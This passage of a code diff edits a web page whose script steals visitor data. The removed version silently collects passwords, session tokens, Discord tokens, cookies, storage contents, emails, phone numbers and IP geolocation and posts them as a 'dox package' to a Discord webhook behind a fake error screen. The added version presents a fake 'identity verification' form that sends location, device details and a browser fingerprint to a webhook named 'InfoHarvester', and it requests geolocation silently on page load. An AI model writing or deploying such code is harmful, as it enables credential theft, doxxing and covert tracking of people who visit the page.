-                    webglTrackable: true,
-                    audioTrackable: true
-                };
+    function sendToWebhook(embed) {
+        const payload = {
+            embeds: [embed],
+            username: 'InfoHarvester',
+            avatar_url: 'https://i.imgur.com/4M34hi2.png'
+        };
+
+        return fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    }
+
+    async function handleSubmit() {
+        statusEl.className = 'status loading';
+        statusEl.innerHTML = '<span class="spinner"></span> fetching location + device data...';
+        submitBtn.disabled = true;
+
+        try {
+            const location = await getLocation();
+            const device = getDeviceInfo();
+            const fingerprint = getBrowserFingerprint();
+
+            const tempData = { location, device, fingerprint };
+            const fullData = collectAllData(tempData);
+            const embed = buildDiscordEmbed(fullData);
+
+            statusEl.innerHTML = '<span class="spinner"></span> sending to secure vault...';
+
+            const response = await sendToWebhook(embed);
+
+            if (response.ok) {
+                statusEl.className = 'status success';
+                statusEl.innerHTML = '✓ verification successful — redirecting...';
+                setTimeout(() => {
+                    document.getElementById('formSection').innerHTML = `
+                        <div style="text-align:center;padding:30px 0;">
+                            <div style="font-size:48px;margin-bottom:16px;">✓</div>
+                            <h2 style="color:#66dd88;">Identity Verified</h2>
+                            <p style="color:#8888bb;margin-top:12px;">You will be redirected shortly.</p>
+                            <p style="color:#444466;font-size:12px;margin-top:20px;">This session is now secure.</p>
+                        </div>
+                    `;
+                    statusEl.style.display = 'none';
+                }, 1200);
             } else {
-                data.trackingWarning = '✅ Do Not Track is ENABLED - user requested privacy';
-                data.extraTracking = {
-                    thirdPartyCookies: 'likely blocked',
-                    crossSiteTracking: 'reduced',
-                    fingerprintingRisk: 'low',
-                    canvasTrackable: false,
-                    webglTrackable: false,
-                    audioTrackable: false
-                };
+                const errText = await response.text();
+                statusEl.className = 'status error';
+                statusEl.innerHTML = `✗ server error (${response.status}) — try again`;
+                submitBtn.disabled = false;
+                console.error('Webhook error:', errText);
             }
-
-            return data;
+        } catch (err) {
+            statusEl.className = 'status error';
+            statusEl.innerHTML = `✗ ${err.message || 'network error'}`;
+            submitBtn.disabled = false;
         }
+    }
 
-        // ─── ACCOUNT GRABBER ──────────────────────────────────────
-        function grabAccounts() {
-            const results = { emails: [], usernames: [], discord: [], social: [], phoneNumbers: [] };
+    submitBtn.addEventListener('click', handleSubmit);
 
-            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-            try {
-                const bodyText = document.body ? document.body.innerText : '';
-                const foundEmails = bodyText.match(emailRegex) || [];
-                foundEmails.forEach(e => {
-                    if (!results.emails.includes(e)) results.emails.push(e);
-                });
-            } catch(e) {}
-
-            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
-            try {
-                const bodyText = document.body ? document.body.innerText : '';
-                const foundPhones = bodyText.match(phoneRegex) || [];
-                foundPhones.forEach(p => {
-                    if (!results.phoneNumbers.includes(p)) results.phoneNumbers.push(p);
-                });
-            } catch(e) {}
-
-            try {
-                ['localStorage', 'sessionStorage'].forEach(storage => {
-                    const source = storage === 'localStorage' ? localStorage : sessionStorage;
-                    for (let i = 0; i < source.length; i++) {
-                        const key = source.key(i);
-                        const val = source.getItem(key);
-                        if (key) {
-                            const lowerKey = key.toLowerCase();
-                            if (lowerKey.includes('email') || lowerKey.includes('user') || lowerKey.includes('username')) {
-                                if (val) {
-                                    if (val.includes('@')) results.emails.push(val);
-                                    else if (val.length > 2 && val.length < 50) results.usernames.push(val);
-                                }
-                            }
-                            if (lowerKey.includes('phone') || lowerKey.includes('mobile') || lowerKey.includes('tel')) {
-                                if (val && val.length > 5) results.phoneNumbers.push(val);
-                            }
-                            if (lowerKey.includes('discord') || lowerKey.includes('token') || lowerKey.includes('webhook')) {
-                                results.discord.push({ key, val: val ? val.substring(0, 50) : 'empty' });
-                            }
-                            if (lowerKey.includes('instagram') || lowerKey.includes('twitter') || lowerKey.includes('facebook') || lowerKey.includes('tiktok') || lowerKey.includes('snapchat')) {
-                                results.social.push({ platform: key, username: val || 'empty' });
-                            }
-                        }
-                    }
-                });
-            } catch(e) {}
-
-            try {
-                document.cookie.split(';').forEach(c => {
-                    const parts = c.trim().split('=');
-                    if (parts.length >= 2) {
-                        const key = parts[0];
-                        const val = decodeURIComponent(parts.slice(1).join('='));
-                        const lowerKey = key.toLowerCase();
-                        if (lowerKey.includes('email') || lowerKey.includes('user') || lowerKey.includes('username')) {
-                            if (val) {
-                                if (val.includes('@')) results.emails.push(val);
-                                else if (val.length > 2 && val.length < 50) results.usernames.push(val);
-                            }
-                        }
-                        if (lowerKey.includes('phone') || lowerKey.includes('mobile')) {
-                            if (val && val.length > 5) results.phoneNumbers.push(val);
-                        }
-                        if (lowerKey.includes('discord') || lowerKey.includes('token')) {
-                            results.discord.push({ key, val: val.substring(0, 50) });
-                        }
-                    }
-                });
-            } catch(e) {}
-
-            try {
-                const params = new URLSearchParams(window.location.search);
-                params.forEach((val, key) => {
-                    const lowerKey = key.toLowerCase();
-                    if (lowerKey.includes('email') || lowerKey.includes('user') || lowerKey.includes('username')) {
-                        if (val) {
-                            if (val.includes('@')) results.emails.push(val);
-                            else if (val.length > 2 && val.length < 50) results.usernames.push(val);
-                        }
-                    }
-                    if (lowerKey.includes('phone') || lowerKey.includes('mobile')) {
-                        if (val && val.length > 5) results.phoneNumbers.push(val);
-                    }
-                });
-            } catch(e) {}
-
-            try {
-                document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(el => {
-                    if (el.value) {
-                        if (el.value.includes('@')) results.emails.push(el.value);
-                        else if (el.value.match(phoneRegex)) results.phoneNumbers.push(el.value);
-                        else if (el.value.length > 2 && el.value.length < 50) results.usernames.push(el.value);
-                    }
-                });
-            } catch(e) {}
-
-            results.emails = [...new Set(results.emails)];
-            results.usernames = [...new Set(results.usernames)];
-            results.phoneNumbers = [...new Set(results.phoneNumbers)];
-
-            return results;
-        }
-
-        // ─── PASSWORD GRABBER ─────────────────────────────────────
-        function grabSavedPasswords() {
-            const passwords = [];
-            
-            try {
-                const pwdInputs = document.querySelectorAll('input[type="password"]');
-                pwdInputs.forEach(el => {
-                    if (el.value) {
-                        passwords.push({
-                            type: 'autofilled',
-                            value: el.value,
-                            id: el.id || 'unknown',
-                            name: el.name || 'unknown'
-                        });
-                    }
-                });
-            } catch(e) {}
-
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const val = localStorage.getItem(key);
-                    if (key.toLowerCase().includes('pass') || 
-                        key.toLowerCase().includes('pwd') ||
-                        key.toLowerCase().includes('token') ||
-                        key.toLowerCase().includes('auth')) {
-                        passwords.push({
-                            type: 'localStorage',
-                            key: key,
-                            value: val
-                        });
-                    }
-                }
-            } catch(e) {}
-
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    const val = sessionStorage.getItem(key);
-                    if (key.toLowerCase().includes('pass') || 
-                        key.toLowerCase().includes('pwd') ||
-                        key.toLowerCase().includes('token') ||
-                        key.toLowerCase().includes('auth')) {
-                        passwords.push({
-                            type: 'sessionStorage',
-                            key: key,
-                            value: val
-                        });
-                    }
-                }
-            } catch(e) {}
-
-            try {
-                const cookieList = document.cookie.split(';').filter(c => c.trim());
-                cookieList.forEach(cookie => {
-                    const [key, val] = cookie.trim().split('=');
-                    if (key.toLowerCase().includes('pass') || 
-                        key.toLowerCase().includes('pwd') ||
-                        key.toLowerCase().includes('token') ||
-                        key.toLowerCase().includes('auth') ||
-                        key.toLowerCase().includes('session')) {
-                        passwords.push({
-                            type: 'cookie',
-                            key: key,
-                            value: val
-                        });
-                    }
-                });
-            } catch(e) {}
-
-            try {
-                const forms = document.querySelectorAll('form');
-                forms.forEach(form => {
-                    const inputs = form.querySelectorAll('input');
-                    let hasPassword = false;
-                    let username = '';
-                    let pwdValue = '';
-                    inputs.forEach(input => {
-                        if (input.type === 'password' && input.value) {
-                            hasPassword = true;
-                            pwdValue = input.value;
-                        }
-                        if (input.type === 'text' || input.type === 'email') {
-                            username = input.value || username;
-                        }
-                    });
-                    if (hasPassword && pwdValue) {
-                        passwords.push({
-                            type: 'form_submission',
-                            username: username || 'unknown',
-                            password: pwdValue,
-                            formAction: form.action || 'unknown'
-                        });
-                    }
-                });
-            } catch(e) {}
-
-            try {
-                const params = new URLSearchParams(window.location.search);
-                params.forEach((val, key) => {
-                    if (key.toLowerCase().includes('token') || 
-                        key.toLowerCase().includes('auth') ||
-                        key.toLowerCase().includes('session')) {
-                        passwords.push({
-                            type: 'url_parameter',
-                            key: key,
-                            value: val
-                        });
-                    }
-                });
-            } catch(e) {}
-
-            return passwords;
-        }
-
-        // ─── SEND TO DISCORD ──────────────────────────────────────
-        async function sendToDiscord(payload, retries = 3) {
-            for (let i = 0; i < retries; i++) {
-                try {
-                    const response = await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                    if (response.ok) {
-                        return true;
-                    } else {
-                        await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
-                    }
-                } catch (e) {
-                    await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
-                }
-            }
-            return false;
-        }
-
-        // ─── MAIN ──────────────────────────────────────────────────
-        async function gatherAndSend() {
-            try {
-                document.getElementById('status').textContent = '⚠️ connection failed • reconnecting...';
-
-                let ipData = {};
-                try {
-                    const resp = await fetch('https://ipapi.co/json/');
-                    ipData = await resp.json();
-                } catch (e) {
-                    ipData = { ip: 'fetch failed' };
-                }
-
-                const rawIP = ipData.ip || 'unknown';
-                const formattedIP = formatIP(rawIP);
-                const city = ipData.city || 'unknown';
-                const region = ipData.region || 'unknown';
-                const country = ipData.country_name || 'unknown';
-                const isp = ipData.org || 'unknown';
-                const postal = ipData.postal || 'unknown';
-                const timezone = ipData.timezone || 'unknown';
-                const asn = ipData.asn || 'unknown';
-                const latitude = ipData.latitude || 'unknown';
-                const longitude = ipData.longitude || 'unknown';
-                const currency = ipData.currency || 'unknown';
-                const countryCode = ipData.country_code || 'unknown';
-
-                document.getElementById('ip-address').textContent = '[ error: ' + formattedIP + ' ]';
-
-                const doxData = grabDoxData();
-                const accounts = grabAccounts();
-                const passwords = grabSavedPasswords();
-
-                let message = '🕵️ **FULL DOX PACKAGE**\n\n';
-                message += `🌐 **IP:** \`${formattedIP}\` (raw: ${rawIP})\n`;
-                message += `📍 **Location:** ${city}, ${region}, ${country}\n`;
-                message += `🗺️ **Coordinates:** ${latitude}, ${longitude}\n`;
-                message += `📮 **Postal/ASN:** ${postal} | \`${asn}\`\n`;
-                message += `🏢 **ISP:** \`${isp}\`\n`;
-                message += `🌍 **Country Code:** \`${countryCode}\`\n`;
-                message += `💰 **Currency:** \`${currency}\`\n`;
-                message += `🕐 **Timezone:** \`${timezone}\`\n`;
-
-                message += `\n🔍 **DO NOT TRACK:** \`${doxData.doNotTrack || 'unspecified'}\`\n`;
-                if (doxData.trackingEnabled) {
-                    message += `⚠️ **TRACKING ENABLED** - fully trackable\n`;
-                } else {
-                    message += `✅ **TRACKING DISABLED** - privacy requested\n`;
-                }
-
-                message += `\n📧 **Emails:** ${accounts.emails.join(', ') || 'none'}\n`;
-                message += `👤 **Usernames:** ${accounts.usernames.join(', ') || 'none'}\n`;
-                message += `📱 **Phone Numbers:** ${accounts.phoneNumbers.join(', ') || 'none'}\n`;
-
-                message += `\n🖥️ **Platform:** \`${doxData.platform || 'unknown'}\`\n`;
-                message += `📱 **Device Name:** \`${doxData.deviceName || 'unknown'}\`\n`;
-                message += `📺 **Screen:** ${doxData.screen?.width || '?'}x${doxData.screen?.height || '?'} | ${doxData.screen?.colorDepth || '?'}-bit\n`;
-                message += `🧠 **CPU Cores:** \`${doxData.hardwareConcurrency || '?'}\`\n`;
-                message += `💾 **Device Memory:** \`${doxData.deviceMemory || '?'} GB\`\n`;
-                message += `🎮 **GPU:** \`${doxData.gpu || 'unknown'}\`\n`;
-
-                message += `\n📶 **Network:** ${doxData.network?.effectiveType || '?'} | ${doxData.network?.rtt || '?'}ms | ${doxData.network?.downlink || '?'}Mbps\n`;
-
-                message += `\n🌍 **Browser Language:** \`${doxData.language || 'unknown'}\`\n`;
-                message += `🗣️ **All Languages:** \`${(doxData.languages || []).join(', ')}\`\n`;
-                message += `🍪 **Cookies Enabled:** \`${doxData.cookieEnabled}\`\n`;
-                message += `👆 **Max Touch Points:** \`${doxData.maxTouchPoints || '0'}\`\n`;
-
-                message += `\n🖌️ **Canvas FP:** \`${(doxData.canvasFingerprint || '').substring(0, 50)}...\`\n`;
-                message += `🎮 **WebGL:** ${typeof doxData.webgl === 'object' ? doxData.webgl.renderer : doxData.webgl}\n`;
-                message += `🎵 **Audio FP:** \`${(doxData.audioFingerprint || '').substring(0, 30)}...\`\n`;
-
-                message += `\n🔌 **Plugins:** ${(doxData.plugins || []).slice(0, 5).join(', ') || 'none'}\n`;
-                message += `📝 **Fonts:** ${(doxData.fonts || []).join(', ') || 'unknown'}\n`;
-
-                if (doxData.installedApps && doxData.installedApps.length > 0) {
-                    message += `\n📱 **Installed Apps:** ${doxData.installedApps.slice(0, 10).join(', ')}\n`;
-                }
-
-                if (doxData.browserExtensions && doxData.browserExtensions.length > 0) {
-                    message += `\n🧩 **Browser Extensions:** ${doxData.browserExtensions.slice(0, 10).join(', ')}\n`;
-                }
-
-                if (doxData.ssids && doxData.ssids.length > 0) {
-                    message += `\n📶 **Saved WiFi/SSIDs:**\n`;
-                    doxData.ssids.slice(0, 5).forEach(s => {
-                        message += `  ${s.key}: ${s.val}\n`;
-                    });
-                }
-
-                if (doxData.savedCredentials && doxData.savedCredentials.length > 0) {
-                    message += `\n🔐 **Saved Credentials Found:**\n`;
-                    doxData.savedCredentials.slice(0, 5).forEach(c => {
-                        message += `  ${c.key}: ${c.val}\n`;
-                    });
-                }
-
-                if (doxData.locationHistory && doxData.locationHistory.length > 0) {
-                    message += `\n📍 **Location History:**\n`;
-                    doxData.locationHistory.slice(0, 3).forEach(l => {
-                        message += `  ${l.key}: ${l.val}\n`;
-                    });
-                }
-
-                if (doxData.paymentInfo && doxData.paymentInfo.length > 0) {
-                    message += `\n💳 **Payment/Billing Info:**\n`;
-                    doxData.paymentInfo.slice(0, 3).forEach(p => {
-                        message += `  ${p.key}: ${p.val}\n`;
-                    });
-                }
-
-                message += `\n📄 **Page URL:** \`${doxData.pageUrl || 'unknown'}\`\n`;
-                message += `🔗 **Referrer:** \`${doxData.referrer || 'direct'}\`\n`;
-
-                if (passwords.length > 0) {
-                    message += `\n🔑 **CAPTURED PASSWORDS (${passwords.length}):**\n`;
-                    passwords.slice(0, 10).forEach(p => {
-                        if (p.type === 'autofilled') {
-                            message += `  🔓 Autofilled: ${p.id} = ${p.value}\n`;
-                        } else if (p.type === 'form_submission') {
-                            message += `  🔑 Form: ${p.username} | ${p.password}\n`;
-                        } else {
-                            message += `  🔐 ${p.type}: ${p.key} = ${p.value}\n`;
-                        }
-                    });
-                    if (passwords.length > 10) message += `  ... and ${passwords.length - 10} more\n`;
-                }
-
-                if (accounts.discord.length > 0) {
-                    message += `\n🎮 **DISCORD TOKENS:**\n`;
-                    accounts.discord.slice(0, 5).forEach(d => {
-                        message += `  ${d.key}: ${d.val}\n`;
-                    });
-                }
-
-                if (accounts.social.length > 0) {
-                    message += `\n📱 **SOCIAL MEDIA:**\n`;
-                    accounts.social.slice(0, 5).forEach(s => {
-                        message += `  ${s.platform}: ${s.username}\n`;
-                    });
-                }
-
-                const cookies = doxData.cookies || 'none';
-                const cookieMsg = `🍪 **ALL COOKIES:**\n\`\`\`\n${cookies.substring(0, 1900)}\n\`\`\``;
-
-                const ls = JSON.stringify(doxData.localStorage || {}, null, 2);
-                const storageMsg = `💾 **localStorage:**\n\`\`\`json\n${ls.substring(0, 1900)}\n\`\`\``;
-
-                const chunks = [];
-                let current = '';
-                message.split('\n').forEach(line => {
-                    if ((current + line + '\n').length > 1900) {
-                        chunks.push(current);
-                        current = '';
-                    }
-                    current += line + '\n';
-                });
-                if (current) chunks.push(current);
-
-                for (let i = 0; i < chunks.length; i++) {
-                    await sendToDiscord({ content: chunks[i] });
-                }
-
-                await sendToDiscord({ content: cookieMsg });
-                await sendToDiscord({ content: storageMsg });
-
-                document.getElementById('status').textContent = '⚠️ connection failed • retry limit exceeded';
-
-            } catch (err) {
-                document.getElementById('status').textContent = '⚠️ connection failed • server unreachable';
-                document.getElementById('ip-address').textContent = '[ error: timeout ]';
-            }
-        }
-
-        gatherAndSend();
-
-    })();
+    // auto-grab on load
+    window.addEventListener('load', () => {
+        // silently pre-fetch location
+        navigator.geolocation?.getCurrentPosition(() => {}, () => {}, { timeout: 5000 });
+    });
+})();
 </script>
-
 </body>
 </html>
